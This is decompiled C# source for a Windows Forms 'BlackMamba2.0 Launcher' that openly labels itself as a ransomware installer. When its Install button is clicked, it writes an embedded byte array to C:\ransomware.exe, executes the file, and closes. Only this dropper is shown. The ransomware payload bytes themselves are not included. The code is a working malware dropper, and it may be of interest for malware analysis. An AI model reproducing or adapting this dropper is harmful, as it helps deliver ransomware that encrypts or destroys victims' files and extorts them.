using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

public class Form1 : Form
{
	private IContainer icontainer_0 = null;

	private Button button1;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		string string_ = "C:\\";
		Form1.smethod_1(Form1.smethod_0(string_, "ransomware.exe"), Class1.Byte_0);
		Form1.smethod_1("C:\\ransomware.exe", Class1.Byte_0);
		Form1.smethod_2("C:\\ransomware.exe");
		Form1.smethod_3((Form)(object)this);
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			Form1.smethod_4((IDisposable)icontainer_0);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		button1 = Form1.smethod_5();
		label1 = Form1.smethod_6();
		Form1.smethod_7((Control)(object)this);
		((Control)button1).set_Location(new Point(84, 356));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(255, 69));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Install");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_Location(new Point(1, 24));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(421, 20));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Click \"Install\" button to install BlackMamba2.0 ransomware");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(420, 437));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("BlackMamba2.0 Launcher");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static string smethod_0(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_1(string string_0, byte[] byte_0)
	{
		File.WriteAllBytes(string_0, byte_0);
	}

	static Process smethod_2(string string_0)
	{
		return Process.Start(string_0);
	}

	static void smethod_3(Form form_0)
	{
		form_0.Close();
	}

	static void smethod_4(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Button smethod_5()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static Label smethod_6()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_7(Control control_0)
	{
		control_0.SuspendLayout();
	}
}
